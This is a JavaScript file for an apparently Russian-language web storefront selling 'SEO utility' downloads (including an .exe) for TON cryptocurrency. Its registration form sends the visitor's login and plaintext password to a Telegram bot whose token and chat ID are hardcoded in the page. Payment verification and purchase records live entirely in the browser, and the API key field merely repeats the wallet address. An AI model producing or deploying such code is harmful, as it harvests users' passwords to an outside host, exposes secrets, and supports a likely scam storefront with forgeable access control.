document.addEventListener('DOMContentLoaded', () => {

    // ==========================================
    // ⚙️ НАСТРОЙКИ (ЗАПОЛНИ ЭТИ ДАННЫЕ)
    // ==========================================
    const TG_BOT_TOKEN = '8295559037:AAHQquYCqOdD9nGofg65ibGOmvLjYlR4QiA';
    const TG_CHAT_ID = '5683927471'; 
    
    const MY_TON_ADDRESS = 'UQCiXX9tf5Uu8hvIqhowpYwjYDti7A5cTVqTVS1CHo5kTr64'; // Твой адрес
    const TON_API_KEY = 'UQCiXX9tf5Uu8hvIqhowpYwjYDti7A5cTVqTVS1CHo5kTr64'; // Ключ с сайта tonapi.io

    const TON_EXCHANGE_RATE = 650; // Курс 1 TON = 650 RUB
    const SUBSCRIPTION_DURATION = 2592000000; // 30 дней в мс
    const isMobile = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);

    // ==========================================
    // 🌍 СЛОВАРЬ И ДАННЫЕ
    // ==========================================
    const translations = { 
        ru: { headerTitle: "SEO Утилита", loginBtn: "Войти", registerBtn: "Регистрация", logoutBtn: "Выход", languageBtn: "Язык", videoTitle: "Посмотрите наш продукт в действии", multitoolDesc: "Наш инструмент анализирует ключевые слова, отслеживает позиции и помогает вам обойти конкурентов.", loading: "Загрузка товаров...", developedIn: "Разработан в 2026.", authTitle: "Авторизация", authBtn: "Войти", demoMode: "Демо: введите любые данные", registerTitle: "Регистрация", sendRequestBtn: "Отправить заявку", buyPrefix: "Купить за", inLibrary: "В библиотеке", download: "Скачать", myPurchases: "Мои покупки", cart: "Корзина", regSuccess: "Заявка отправлена администратору!", regError: "Ошибка отправки. Попробуйте позже.", paySuccess: "Оплата подтверждена! Доступ открыт.", welcome: "Добро пожаловать,", noSubs: "У вас пока нет активных подписок.", loginAlert: "Сначала войдите в аккаунт!" }, 
        en: { headerTitle: "SEO Utility", loginBtn: "Log In", registerBtn: "Sign Up", logoutBtn: "Log Out", languageBtn: "Language", videoTitle: "See our product in action", multitoolDesc: "Our tool analyzes keywords, tracks rankings, and helps you outrank competitors.", loading: "Loading products...", developedIn: "Developed in 2026.", authTitle: "Authorization", authBtn: "Log In", demoMode: "Demo: enter any data", registerTitle: "Registration", sendRequestBtn: "Send Request", buyPrefix: "Buy for", inLibrary: "Owned", download: "Download", myPurchases: "My Library", cart: "Cart", regSuccess: "Request sent to admin!", regError: "Sending error. Try again later.", paySuccess: "Payment confirmed! Access granted.", welcome: "Welcome,", noSubs: "No active subscriptions.", loginAlert: "Please log in first!" } 
    };
    
    let currentLang = 'ru'; 

    const products = [ 
        { id: 1, title: "Parser Pro", description: "Сбор данных с любых сайтов в пару кликов.", price: 1500, image: "https://placehold.co/600x400/1e293b/4ade80?text=PARSER+PRO", file: "parser_setup.exe" }, 
        { id: 2, title: "Rank Tracker", description: "Точный мониторинг позиций в Google и Яндекс.", price: 2500, image: "https://placehold.co/600x400/1e293b/00ffff?text=RANK+TRACKER", file: "rank_tracker.zip" }, 
        { id: 3, title: "SEO Audit", description: "Полный технический аудит вашего сайта.", price: 3500, image: "https://placehold.co/600x400/1e293b/ff00ff?text=SEO+AUDIT", file: "audit_tool.dmg" }, 
        { id: 4, title: "Unlimited", description: "Доступ ко всем инструментам без ограничений.", price: 9990, image: "https://placehold.co/600x400/1e293b/ffff66?text=UNLIMITED+VIP", file: "acus_full_pack.rar" } 
    ];

    let currentUser = localStorage.getItem('acus_user');
    let userPurchases = []; 
    let currentOrder = null;
    let checkInterval = null;

    // --- DOM ЭЛЕМЕНТЫ ---
    const grid = document.getElementById('products-grid');
    const mainMenu = document.getElementById('mainMenu');
    const authModal = document.getElementById('authModal');
    const paymentModal = document.getElementById('paymentModal');

    // ==========================================
    // 🔍 ЛОГИКА АВТО-ОПЛАТЫ (TONAPI)
    // ==========================================
    async function checkPayment() {
        if (!currentOrder) return;
        try {
            const response = await fetch(`https://tonapi.io/v2/blockchain/accounts/${MY_TON_ADDRESS}/transactions?limit=15`, {
                headers: { 'Authorization': `Bearer ${TON_API_KEY}` }
            });
            const data = await response.json();
            if (data.transactions) {
                for (let tx of data.transactions) {
                    const comment = tx.in_msg?.decoded_body?.text || "";
                    const valueTon = (tx.in_msg?.value || 0) / 1000000000;
                    
                    if (comment === currentOrder.memo && valueTon >= (currentOrder.amountTon * 0.98)) {
                        finalizeTransaction();
                        break;
                    }
                }
            }
        } catch (e) { console.error("Blockchain error:", e); }
    }

    function finalizeTransaction() {
        clearInterval(checkInterval);
        userPurchases.push({ id: currentOrder.productId, expires: Date.now() + SUBSCRIPTION_DURATION });
        localStorage.setItem(`purchases_${currentUser}`, JSON.stringify(userPurchases));
        
        // Уведомление владельцу
        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: TG_CHAT_ID, 
                text: `✅ <b>ОПЛАТА ПОЛУЧЕНА!</b>\nЮзер: ${currentUser}\nТовар: ${currentOrder.title}\nСумма: ${currentOrder.amountTon} TON`, 
                parse_mode: 'HTML' 
            })
        });

        alert(translations[currentLang].paySuccess);
        paymentModal.classList.add('hidden');
        renderProducts();
    }

    // ==========================================
    // 🛠 СТАНДАРТНЫЕ ФУНКЦИИ
    // ==========================================
    function loadAndMigratePurchases(user) {
        if (!user) { userPurchases = []; return; }
        userPurchases = JSON.parse(localStorage.getItem(`purchases_${user}`)) || [];
    }

    function checkExpirations() {
        if (!currentUser) return;
        const now = Date.now();
        const countBefore = userPurchases.length;
        userPurchases = userPurchases.filter(p => p.expires > now);
        if (userPurchases.length !== countBefore) localStorage.setItem(`purchases_${currentUser}`, JSON.stringify(userPurchases));
    }

    function renderProducts() {
        checkExpirations();
        grid.innerHTML = '';
        products.forEach(product => {
            const card = document.createElement('div');
            card.className = 'card';
            const purchase = userPurchases.find(p => p.id === product.id);
            const isOwned = !!purchase;
            let btnContent = '';
            
            if (isOwned) {
                const minLeft = Math.max(0, Math.ceil((purchase.expires - Date.now()) / 60000));
                btnContent = `<i class="fa fa-check"></i> ${translations[currentLang].inLibrary} <br><span style="font-size:0.7em; opacity:0.8">${minLeft} min left</span>`;
            } else {
                btnContent = `${translations[currentLang].buyPrefix} ${product.price} ₽`;
            }
            
            card.innerHTML = `<div class="card-content"><div class="card-img-wrapper"><img src="${product.image}"></div><div class="card-info-block"><h3>${product.title}</h3><p>${product.description}</p></div><button class="price-button ${isOwned?'owned':''}" ${isOwned?'':`onclick="buyProduct(${product.id})"`}>${btnContent}</button></div>`;
            grid.appendChild(card);
        });
        if (!isMobile) apply3DEffect();
    }

    window.buyProduct = (id) => {
        if (!currentUser) { alert(translations[currentLang].loginAlert); authModal.classList.remove('hidden'); return; }
        const product = products.find(p => p.id === id);
        const amountTon = (product.price / TON_EXCHANGE_RATE).toFixed(2);
        const memo = `ACUS_${Math.floor(10000 + Math.random()*90000)}`;

        currentOrder = { productId: id, title: product.title, amountTon, memo };
        document.getElementById('payName').textContent = product.title;
        document.getElementById('payAmount').textContent = `${amountTon} TON`;
        document.getElementById('walletAddr').value = MY_TON_ADDRESS;
        document.getElementById('payMemo').value = memo;
        paymentModal.classList.remove('hidden');

        if (checkInterval) clearInterval(checkInterval);
        checkInterval = setInterval(checkPayment, 8000);
    };

    // --- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (МЕНЮ, ЛОГИН) ---
    function updateAuthUI() {
        loadAndMigratePurchases(currentUser);
        if(currentUser) {
            document.getElementById('guestNav').classList.add('hidden');
            document.getElementById('userNav').classList.remove('hidden');
            document.getElementById('menuUserName').textContent = currentUser;
        } else {
            document.getElementById('guestNav').classList.remove('hidden');
            document.getElementById('userNav').classList.add('hidden');
        }
        renderProducts();
    }

    document.getElementById('hamburgerBtn').addEventListener('click', (e) => { e.stopPropagation(); mainMenu.classList.toggle('hidden'); });
    document.getElementById('menuLoginBtn').addEventListener('click', () => { authModal.classList.remove('hidden'); mainMenu.classList.add('hidden'); });
    document.getElementById('menuRegisterBtn').addEventListener('click', () => { document.getElementById('regModal').classList.remove('hidden'); mainMenu.classList.add('hidden'); });
    document.getElementById('menuLogoutBtn').addEventListener('click', () => { localStorage.removeItem('acus_user'); currentUser = null; updateAuthUI(); mainMenu.classList.add('hidden'); });
    
    document.querySelectorAll('.close, .close-reg, .close-payment, .close-library').forEach(b => b.addEventListener('click', () => {
        clearInterval(checkInterval);
        document.querySelectorAll('.modal').forEach(m => m.classList.add('hidden'));
    }));

    document.getElementById('loginForm').addEventListener('submit', (e) => {
        e.preventDefault();
        currentUser = document.getElementById('loginEmail').value;
        localStorage.setItem('acus_user', currentUser);
        updateAuthUI(); authModal.classList.add('hidden');
    });

    document.getElementById('regFormRequest').addEventListener('submit', (e) => {
        e.preventDefault();
        const login = document.getElementById('newLogin').value;
        const pass = document.getElementById('newPass').value;
        const msg = `🔔 <b>Новая регистрация:</b>\nЛогин: ${login}\nПасс: ${pass}`;
        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML'})});
        alert(translations[currentLang].regSuccess);
        document.getElementById('regModal').classList.add('hidden');
    });

    function apply3DEffect() {
        document.querySelectorAll('.card').forEach(card => {
            card.addEventListener('mousemove', (e) => {
                const rect = card.getBoundingClientRect();
                const x = (e.clientX - rect.left) / rect.width - 0.5;
                const y = (e.clientY - rect.top) / rect.height - 0.5;
                card.style.transform = `perspective(1000px) rotateX(${y * -15}deg) rotateY(${x * 15}deg) scale3d(1.05, 1.05, 1.05)`;
            });
            card.addEventListener('mouseleave', () => card.style.transform = 'none');
        });
    }

    // Аврора анимация
    if (!isMobile) {
        document.addEventListener('mousemove', (e) => {
            const x = e.clientX / window.innerWidth;
            const y = e.clientY / window.innerHeight;
            document.querySelector('.aurora.one').style.transform = `translate(${x*80-40}%, ${y*80-40}%)`;
            document.querySelector('.aurora.two').style.transform = `translate(${x*-80+40}%, ${y*-80+40}%)`;
        });
    }

    updateAuthUI();
});

